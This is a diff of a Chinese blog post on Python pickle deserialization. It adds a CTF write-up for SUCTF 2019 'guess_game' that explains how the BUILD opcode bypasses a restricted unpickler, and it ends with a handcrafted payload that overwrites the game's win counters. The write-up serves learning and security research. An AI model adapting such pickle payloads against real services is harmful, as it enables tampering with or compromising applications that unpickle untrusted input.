@@ -100,13 +100,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    14k
+                    16k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    12 mins.
+                    15 mins.
                 </span>
                 
                 
@@ -436,6 +436,70 @@ print(payload)</code></pre>
 <h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
 <li>使用v0版的pickle协议,保证shellcode的通用性</li>
 </ol>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">题目链接</a></p>
+<p>考点:pickle</p>
+<p>代码审计一波后</p>
+<p>如果猜对10次后会给flag(机会只有10次)</p>
+<p>因为知道是考pickle直接全局搜索pickle发现在server处有</p>
+<p><code>ticket = restricted_loads(ticket)</code></p>
+<p>其中ticket是我们可控点</p>
+<p>跟进去看</p>
+<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        # Only allow safe classes
+        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:
+            return getattr(sys.modules[module], name)
+        # Forbid everything else.
+        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))
+
+
+def restricted_loads(s):
+    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
+    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre>
+<p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p>
+<p>在这一题中拿到flag有两种方式:</p>
+<ol>
+<li>命令执行</li>
+<li>通过游戏</li>
+</ol>
+<p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p>
+<p>而游戏中判定赢的条件是</p>
+<pre><code class="python">class Game
+    def is_win(self):
+        return self.win_count == max_round</code></pre>
+<p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p>
+<p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p>
+<p>那么接下来就是如何修改了</p>
+<p>在pickle的操作码中我们发现</p>
+<p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p>
+<p>其中update()就可以修改game的属性了</p>
+<p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p>
+<p>一路跟踪发现b操作码的实现</p>
+<pre><code class="python">    def load_build(self):
+        stack = self.stack
+        state = stack.pop()
+        inst = stack[-1]
+        setstate = getattr(inst, &quot;__setstate__&quot;, None)
+        if setstate is not None:
+            setstate(state)
+            return
+        slotstate = None
+        if isinstance(state, tuple) and len(state) == 2:
+            state, slotstate = state
+        if state:
+            inst_dict = inst.__dict__
+            intern = sys.intern
+            for k, v in state.items():
+                if type(k) is str:
+                    inst_dict[intern(k)] = v
+                else:
+                    inst_dict[k] = v
+        if slotstate:
+            for k, v in slotstate.items():
+                setattr(inst, k, v)</code></pre>
+<p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p>
+<p>最后的payload:</p>
+<pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
 <p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p>
 <p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p>
@@ -498,7 +562,7 @@ print(payload)</code></pre>
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python-pickle"><span class="toc-number">1.</span> <span class="toc-text">python pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#推荐文章"><span class="toc-number">1.1.</span> <span class="toc-text">推荐文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle操作码大全-v0"><span class="toc-number">1.2.</span> <span class="toc-text">pickle操作码大全(v0)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle介绍"><span class="toc-number">1.3.</span> <span class="toc-text">pickle介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle的大致过程"><span class="toc-number">1.3.1.</span> <span class="toc-text">pickle的大致过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unpickle的大致过程"><span class="toc-number">1.3.2.</span> <span class="toc-text">unpickle的大致过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pvm组成-解析pickle"><span class="toc-number">1.3.3.</span> <span class="toc-text">pvm组成(解析pickle)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pvm指令格式"><span class="toc-number">1.3.4.</span> <span class="toc-text">pvm指令格式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何生成pickle"><span class="toc-number">1.4.</span> <span class="toc-text">如何生成pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#操作码"><span class="toc-number">1.4.1.</span> <span class="toc-text">操作码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写pickle的一些技巧"><span class="toc-number">1.5.</span> <span class="toc-text">编写pickle的一些技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手写pickle模板"><span class="toc-number">1.5.1.</span> <span class="toc-text">手写pickle模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-reduce-来生成pickle代码"><span class="toc-number">1.5.2.</span> <span class="toc-text">利用__reduce__来生成pickle代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用marshal和cPickle来生成代码"><span class="toc-number">1.5.3.</span> <span class="toc-text">利用marshal和cPickle来生成代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle工具"><span class="toc-number">1.6.</span> <span class="toc-text">pickle工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">1.7.</span> <span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-number">1.7.1.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意"><span class="toc-number">1.8.</span> <span class="toc-text">注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.9.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python-pickle"><span class="toc-number">1.</span> <span class="toc-text">python pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#推荐文章"><span class="toc-number">1.1.</span> <span class="toc-text">推荐文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle操作码大全-v0"><span class="toc-number">1.2.</span> <span class="toc-text">pickle操作码大全(v0)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle介绍"><span class="toc-number">1.3.</span> <span class="toc-text">pickle介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle的大致过程"><span class="toc-number">1.3.1.</span> <span class="toc-text">pickle的大致过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unpickle的大致过程"><span class="toc-number">1.3.2.</span> <span class="toc-text">unpickle的大致过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pvm组成-解析pickle"><span class="toc-number">1.3.3.</span> <span class="toc-text">pvm组成(解析pickle)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pvm指令格式"><span class="toc-number">1.3.4.</span> <span class="toc-text">pvm指令格式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何生成pickle"><span class="toc-number">1.4.</span> <span class="toc-text">如何生成pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#操作码"><span class="toc-number">1.4.1.</span> <span class="toc-text">操作码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写pickle的一些技巧"><span class="toc-number">1.5.</span> <span class="toc-text">编写pickle的一些技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手写pickle模板"><span class="toc-number">1.5.1.</span> <span class="toc-text">手写pickle模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-reduce-来生成pickle代码"><span class="toc-number">1.5.2.</span> <span class="toc-text">利用__reduce__来生成pickle代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用marshal和cPickle来生成代码"><span class="toc-number">1.5.3.</span> <span class="toc-text">利用marshal和cPickle来生成代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle工具"><span class="toc-number">1.6.</span> <span class="toc-text">pickle工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">1.7.</span> <span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-number">1.7.1.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意"><span class="toc-number">1.8.</span> <span class="toc-text">注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题"><span class="toc-number">1.9.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suctf-guess-game"><span class="toc-number">1.9.1.</span> <span class="toc-text">suctf guess_game</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.10.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
                 </div>
             </div>
             
